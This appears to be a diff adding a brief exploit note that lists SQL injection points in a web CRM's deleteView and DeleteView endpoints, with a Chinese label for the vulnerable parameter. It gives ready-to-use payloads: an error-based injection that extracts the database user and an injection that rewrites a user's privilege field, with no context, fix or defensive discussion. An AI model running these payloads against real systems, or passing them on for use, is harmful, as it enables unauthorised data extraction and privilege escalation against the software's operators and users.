@@ -1,0 +1,12 @@
+1.
+/general/crm/apps/crm/include/deleteView.php    参数：$id
+payload:
+/general/crm/apps/crm/include/deleteView.php?id=1 and (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+2.
+/general/crm/apps/crm/include/delete_submit.php
+
+3.
+/general/crm/modules/Account/account/DeleteView/index.php
+payload:
+/general/crm/modules/Account/account/DeleteView/index.php?entity=user set USER_PRIV=1 where user_id=0x636872%23
